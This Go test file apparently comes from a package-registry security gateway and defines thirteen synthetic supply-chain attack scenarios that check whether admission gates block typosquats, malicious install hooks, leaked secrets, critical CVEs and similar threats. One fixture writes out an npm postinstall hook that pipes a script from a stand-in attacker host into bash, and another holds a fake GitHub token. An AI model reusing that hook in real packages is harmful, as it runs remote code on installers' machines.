package redteam

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/blechschmidt/pullthrough-security/internal/buildprov"
	"github.com/blechschmidt/pullthrough-security/internal/depfirewall"
	"github.com/blechschmidt/pullthrough-security/internal/installhooks"
	"github.com/blechschmidt/pullthrough-security/internal/license"
	"github.com/blechschmidt/pullthrough-security/internal/malfeed"
	"github.com/blechschmidt/pullthrough-security/internal/maturity"
	"github.com/blechschmidt/pullthrough-security/internal/nameguard"
	"github.com/blechschmidt/pullthrough-security/internal/policy"
	"github.com/blechschmidt/pullthrough-security/internal/proxy"
	"github.com/blechschmidt/pullthrough-security/internal/rebuildverify"
	"github.com/blechschmidt/pullthrough-security/internal/secretscan"
	"github.com/blechschmidt/pullthrough-security/internal/sigverify"
	"github.com/blechschmidt/pullthrough-security/internal/vulnscan"
)

// Scenario is one self-contained synthetic supply-chain attack: a fixture run
// end-to-end against an in-process gateway wired with the gate under test, with
// an assertion about how the admission pipeline must respond.
type Scenario struct {
	// ID is the stable, sortable scenario identifier.
	ID string
	// Name is a human-readable title.
	Name string
	// Category is the attack family.
	Category string
	// ExpectedGate is the admission control the scenario validates.
	ExpectedGate string
	// Attack describes the synthetic attack injected.
	Attack string
	// ExpectBlock is the asserted disposition (true = must block; false = must
	// admit, e.g. a critical CVE suppressed by a VEX not_affected statement).
	ExpectBlock bool
	// AcceptGates lists the fired gates considered a correct block. Defaults to
	// {ExpectedGate}; set explicitly when a control enforces through another gate
	// (e.g. secret detection enforces via the policy gate).
	AcceptGates []string
	// setup realizes the gateway + request for this scenario.
	setup func() (*scenarioSetup, error)
}

// Scenarios returns the curated red-team catalog. Each scenario is independent
// and deterministic; the suite covers the supply-chain attack classes the
// project's admission gates are built to stop.
func Scenarios() []Scenario {
	return []Scenario{
		scenarioTyposquat(),
		scenarioDependencyConfusion(),
		scenarioKnownMalicious(),
		scenarioDepFirewallPin(),
		scenarioVersionCooldown(),
		scenarioUnsignedArtifact(),
		scenarioForgedProvenance(),
		scenarioInstallHookPayload(),
		scenarioEmbeddedSecret(),
		scenarioCriticalCVE(),
		scenarioCriticalCVESuppressedByVEX(),
		scenarioLicenseViolation(),
		scenarioReproducibleBuildMismatch(),
	}
}

// --- Name-based gates (refuse before any upstream fetch) ----------------------

func scenarioTyposquat() Scenario {
	return Scenario{
		ID:           "01-typosquat-npm",
		Name:         "Typosquat of a popular npm package",
		Category:     "typosquat",
		ExpectedGate: "nameguard",
		Attack:       `pull "expres" — one deletion from the popular "express"`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			s, err := gatewayBuilder{
				upstream: serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) {
					d.NameGuard = nameguard.NewService(nameguard.Config{DetectHomoglyphs: true}, discardLogger())
				},
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("expres", "1.0.0")
			return s, nil
		},
	}
}

func scenarioDependencyConfusion() Scenario {
	return Scenario{
		ID:           "02-dependency-confusion-npm",
		Name:         "Dependency-confusion shadowing of an internal package",
		Category:     "dependency-confusion",
		ExpectedGate: "nameguard",
		Attack:       `pull public "acme-internal-lib" that shadows a registered internal namespace`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			s, err := gatewayBuilder{
				upstream: serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) {
					d.NameGuard = nameguard.NewService(nameguard.Config{
						InternalNamespaces: map[string][]string{"npm": {"acme-internal-lib"}},
						DetectHomoglyphs:   true,
					}, discardLogger())
				},
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("acme-internal-lib", "1.0.0")
			return s, nil
		},
	}
}

func scenarioKnownMalicious() Scenario {
	return Scenario{
		ID:           "03-known-malicious-npm",
		Name:         "Known-malicious coordinate on a malware feed",
		Category:     "known-malicious",
		ExpectedGate: "malfeed",
		Attack:       `pull "evil-stealer" listed as a credential stealer on the malware feed`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			svc := malfeed.NewService(malfeed.Config{
				InitialEntries: []malfeed.Entry{{
					ID:          "MAL-REDTEAM-0001",
					Ecosystem:   "npm",
					Name:        "evil-stealer",
					AllVersions: true,
					Summary:     "synthetic credential stealer",
					Categories:  []string{"credential-stealer"},
					Source:      "redteam",
				}},
				InitialLoaded: true,
			})
			s, err := gatewayBuilder{
				upstream:  serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) { d.Malfeed = svc },
			}.build()
			if err != nil {
				svc.Close()
				return nil, err
			}
			s.request = npmPull("evil-stealer", "1.0.0")
			prev := s.cleanup
			s.cleanup = func() { prev(); svc.Close() }
			return s, nil
		},
	}
}

func scenarioDepFirewallPin() Scenario {
	return Scenario{
		ID:           "04-depfirewall-pin-violation",
		Name:         "Dependency-firewall version-pin violation",
		Category:     "version-pin-violation",
		ExpectedGate: "depfirewall",
		Attack:       `pull left-pad@1.4.0 when the firewall pins left-pad to 1.3.0`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			svc, err := depfirewall.NewService(depfirewall.Config{
				Rules: []depfirewall.Rule{{Ecosystem: "npm", Name: "left-pad", Pinned: []string{"1.3.0"}}},
			})
			if err != nil {
				return nil, err
			}
			s, err := gatewayBuilder{
				upstream:  serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) { d.DepFirewall = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("left-pad", "1.4.0")
			return s, nil
		},
	}
}

func scenarioVersionCooldown() Scenario {
	return Scenario{
		ID:           "05-version-cooldown-evasion",
		Name:         "Fast publish-and-yank inside the release cooldown",
		Category:     "version-cooldown",
		ExpectedGate: "maturity",
		Attack:       `pull a version published moments ago, inside the maturity cooldown window`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			svc := maturity.NewService(maturity.Config{
				// A very long cooldown with a just-published timestamp keeps the version
				// "cooling" regardless of wall-clock time, so the assertion is stable.
				DefaultCooldown: 1000 * 24 * time.Hour,
				Resolver:        recentResolver{ago: time.Minute},
			})
			s, err := gatewayBuilder{
				upstream:  serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) { d.Maturity = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("freshpkg", "9.9.9")
			return s, nil
		},
	}
}

// --- Content gates (run after the artifact is fetched/cached) -----------------

func scenarioUnsignedArtifact() Scenario {
	return Scenario{
		ID:           "06-unsigned-artifact",
		Name:         "Unsigned artifact where a signature is required",
		Category:     "missing-signature",
		ExpectedGate: "sigverify",
		Attack:       `pull a package the upstream publishes with no cosign/Sigstore signature`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			svc, err := sigverify.NewService(sigverify.Config{
				Action:           policy.ActionBlock,
				FailSeverity:     sigverify.SeverityHigh,
				RequireSignature: true,
			}, noSignatureSource{}, discardLogger())
			if err != nil {
				return nil, err
			}
			s, err := gatewayBuilder{
				upstream:  serveTarball(npmTarball(map[string]any{"name": "signed-pkg", "version": "1.0.0"})),
				configure: func(d *proxy.Dependencies) { d.Sigverify = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("signed-pkg", "1.0.0")
			return s, nil
		},
	}
}

func scenarioForgedProvenance() Scenario {
	return Scenario{
		ID:           "07-missing-build-provenance",
		Name:         "Missing/forged inbound build provenance",
		Category:     "forged-provenance",
		ExpectedGate: "buildprov",
		Attack:       `pull a package with no verifiable build-provenance attestation when one is required`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			svc, err := buildprov.NewService(buildprov.Config{
				Mode:              buildprov.ModeEnforce,
				RequireProvenance: true,
			}, noProvenanceSource{}, discardLogger())
			if err != nil {
				return nil, err
			}
			s, err := gatewayBuilder{
				upstream:  serveTarball(npmTarball(map[string]any{"name": "provpkg", "version": "1.0.0"})),
				configure: func(d *proxy.Dependencies) { d.BuildProv = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("provpkg", "1.0.0")
			return s, nil
		},
	}
}

func scenarioInstallHookPayload() Scenario {
	return Scenario{
		ID:           "08-install-hook-payload",
		Name:         "Malicious npm postinstall hook",
		Category:     "install-hook",
		ExpectedGate: "installhooks",
		Attack:       `pull a package whose postinstall pipes a remote script into a shell`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			svc, err := installhooks.NewService(installhooks.DefaultConfig())
			if err != nil {
				return nil, err
			}
			tgz := npmTarball(map[string]any{
				"name": "demo", "version": "1.0.0",
				"scripts": map[string]any{"postinstall": "curl -s http://evil.example/x | bash"},
			})
			s, err := gatewayBuilder{
				upstream:  serveTarball(tgz),
				configure: func(d *proxy.Dependencies) { d.InstallHooks = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("demo", "1.0.0")
			return s, nil
		},
	}
}

func scenarioEmbeddedSecret() Scenario {
	// Secret detection is a commit-scan control (Task 29), not a standalone pull
	// gate: a secret in the source commit floors the commit's risk score, which the
	// policy gate then blocks on. This scenario runs the real secretscan detector
	// over a fixture diff, derives the risk floor from what it found, and asserts
	// the policy gate refuses the pull — proving the secretscan→policy enforcement
	// path end-to-end. The block is therefore correctly attributed to the policy
	// gate.
	return Scenario{
		ID:           "09-embedded-secret",
		Name:         "Embedded credential in the source commit",
		Category:     "embedded-secret",
		ExpectedGate: "secretscan",
		Attack:       `source commit adds a hardcoded GitHub token; risk floor blocks the pull via policy`,
		ExpectBlock:  true,
		AcceptGates:  []string{"policy"},
		setup: func() (*scenarioSetup, error) {
			// A unified-diff hunk adding a hardcoded GitHub token.
			patch := "@@ -0,0 +1,1 @@\n" +
				`+	token := "ghp_AbCdEf0123456789AbCdEf0123456789AbCd"` + "\n"
			detector := secretscan.New(secretscan.Config{})
			findings := detector.ScanFiles([]secretscan.FileInput{{Path: "config.go", Patch: patch}})
			if len(findings) == 0 {
				return nil, fmt.Errorf("secretscan detector found no secret in the fixture; cannot drive the policy gate")
			}
			floor := secretRiskFloor(findings)

			asmt := policy.Assessment{
				Found:           true,
				HasVerdict:      true,
				RiskScore:       floor,
				CommitSHA:       "deadbeefcafe0009",
				HighestSeverity: worstSeverity(findings),
			}
			engine := policy.New(
				policy.Config{Default: policy.Rule{BlockAtRiskScore: 50}},
				fixedAssessor{asmt: asmt},
				discardLogger(),
			)
			s, err := gatewayBuilder{
				upstream:  serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) { d.Policy = engine },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("leaky", "1.0.0")
			return s, nil
		},
	}
}

func scenarioCriticalCVE() Scenario {
	return Scenario{
		ID:           "10-critical-cve",
		Name:         "Artifact with a critical CVE",
		Category:     "critical-cve",
		ExpectedGate: "vulnscan",
		Attack:       `pull a package whose SBOM resolves to a critical (CVSS 9.8) advisory`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			scanner := stubVulnScanner{vulns: []vulnscan.Vulnerability{{
				ID: "CVE-REDTEAM-9999", Severity: vulnscan.SeverityCritical, CVSS: 9.8,
				Package: "evil", Version: "1.0.0", FixedVersions: []string{"1.0.1"},
			}}}
			svc, err := vulnscan.NewService(
				vulnscan.Config{FailSeverity: vulnscan.SeverityHigh, Action: policy.ActionBlock},
				scanner, discardLogger())
			if err != nil {
				return nil, err
			}
			s, err := gatewayBuilder{
				upstream:  serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) { d.Vulnerabilities = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("evil", "1.0.0")
			return s, nil
		},
	}
}

func scenarioCriticalCVESuppressedByVEX() Scenario {
	// The negative control: the SAME critical CVE, but a VEX not_affected statement
	// for the exact component must suppress it so the pull is ADMITTED. This proves
	// VEX suppression works (and guards against it silently ceasing to apply, which
	// would turn this into a false positive that blocks a safe artifact).
	return Scenario{
		ID:           "11-critical-cve-vex-suppressed",
		Name:         "Critical CVE suppressed by a VEX not_affected statement",
		Category:     "vex-suppression",
		ExpectedGate: "vulnscan",
		Attack:       `same critical CVE as scenario 10, with an OpenVEX not_affected statement`,
		ExpectBlock:  false,
		setup: func() (*scenarioSetup, error) {
			const purl = "pkg:npm/lodash@4.17.20"
			const cve = "CVE-REDTEAM-1111"
			scanner := stubVulnScanner{vulns: []vulnscan.Vulnerability{{
				ID: cve, Severity: vulnscan.SeverityCritical, CVSS: 9.8,
				Component: purl, Package: "lodash", Version: "4.17.20",
			}}}
			vexDoc := fmt.Sprintf(`{
  "@context": "https://openvex.dev/ns/v0.2.0",
  "timestamp": "2026-01-01T00:00:00Z",
  "statements": [{
    "vulnerability": {"name": %q},
    "products": [{"@id": %q}],
    "status": "not_affected",
    "justification": "vulnerable_code_not_present"
  }]
}`, cve, purl)
			store := vulnscan.NewVEXStore(discardLogger())
			parsed, err := vulnscan.ParseVEX([]byte(vexDoc), "redteam-vex")
			if err != nil {
				return nil, err
			}
			store.AddDocument(parsed)

			svc, err := vulnscan.NewService(
				vulnscan.Config{FailSeverity: vulnscan.SeverityHigh, Action: policy.ActionBlock, VEX: store},
				scanner, discardLogger())
			if err != nil {
				return nil, err
			}
			s, err := gatewayBuilder{
				upstream:  serveRaw([]byte("ARTIFACT")),
				configure: func(d *proxy.Dependencies) { d.Vulnerabilities = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("lodash", "4.17.20")
			return s, nil
		},
	}
}

func scenarioLicenseViolation() Scenario {
	return Scenario{
		ID:           "12-license-violation",
		Name:         "Denied (strong-copyleft) license",
		Category:     "license-violation",
		ExpectedGate: "license",
		Attack:       `pull a package declaring GPL-3.0-only against a strong-copyleft denylist`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			svc, err := license.NewService(license.Config{
				Base: license.PolicyConfig{
					Allow: []string{"MIT", "Apache-2.0"},
					Deny:  []string{"@strong-copyleft"},
				},
			}, discardLogger())
			if err != nil {
				return nil, err
			}
			tgz := npmTarball(map[string]any{"name": "copyleft", "version": "1.0.0", "license": "GPL-3.0-only"})
			s, err := gatewayBuilder{
				upstream:  serveTarball(tgz),
				configure: func(d *proxy.Dependencies) { d.License = svc },
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("copyleft", "1.0.0")
			return s, nil
		},
	}
}

func scenarioReproducibleBuildMismatch() Scenario {
	return Scenario{
		ID:           "13-reproducible-build-mismatch",
		Name:         "Binary that does not derive from its attested source",
		Category:     "reproducible-build-mismatch",
		ExpectedGate: "rebuildverify",
		Attack:       `rebuild-from-source yields a digest that differs from the upstream-served artifact`,
		ExpectBlock:  true,
		setup: func() (*scenarioSetup, error) {
			builder := mismatchBuilder{
				ecos:           []string{"npm"},
				digest:         "sha256:" + strings.Repeat("b", 64),
				upstreamDigest: "sha256:" + strings.Repeat("a", 64),
			}
			svc, err := rebuildverify.NewService(rebuildverify.Config{
				Enabled:  true,
				Mode:     rebuildverify.ModeEnforce,
				Async:    false, // verify synchronously so the gate can block this request
				Registry: rebuildverify.NewRegistry(builder),
			})
			if err != nil {
				return nil, err
			}
			s, err := gatewayBuilder{
				upstream: serveTarball(npmTarball(map[string]any{"name": "tampered", "version": "1.0.0"})),
				configure: func(d *proxy.Dependencies) {
					d.RebuildVerify = svc
					d.Provenance = fixedProvenanceResolver{
						commit: "abc123abc123abc123abc123abc123abc123abcd",
						repo:   "https://example.test/acme/tampered",
					}
				},
			}.build()
			if err != nil {
				return nil, err
			}
			s.request = npmPull("tampered", "1.0.0")
			return s, nil
		},
	}
}

// fixedAssessor is a policy.AssessmentSource returning a fixed assessment, used
// to drive the policy gate from a precomputed (secret-derived) risk score.
type fixedAssessor struct{ asmt policy.Assessment }

func (a fixedAssessor) Assess(context.Context, policy.Artifact) (policy.Assessment, error) {
	return a.asmt, nil
}

// secretRiskFloor maps the worst secret-finding severity to a commit risk floor,
// mirroring how the commit-scan pipeline (Task 29) elevates a verdict's risk
// score when a secret is detected. The floor exceeds the policy block threshold
// for high/critical findings.
func secretRiskFloor(findings []secretscan.Finding) int {
	floor := 0
	for _, f := range findings {
		switch strings.ToLower(f.Severity) {
		case secretscan.SeverityCritical:
			if floor < 95 {
				floor = 95
			}
		case secretscan.SeverityHigh:
			if floor < 80 {
				floor = 80
			}
		case secretscan.SeverityMedium:
			if floor < 60 {
				floor = 60
			}
		}
	}
	return floor
}

func worstSeverity(findings []secretscan.Finding) string {
	rank := map[string]int{
		secretscan.SeverityInfo: 1, secretscan.SeverityLow: 2,
		secretscan.SeverityMedium: 3, secretscan.SeverityHigh: 4, secretscan.SeverityCritical: 5,
	}
	worst := ""
	best := 0
	for _, f := range findings {
		s := strings.ToLower(f.Severity)
		if rank[s] > best {
			best = rank[s]
			worst = s
		}
	}
	return worst
}
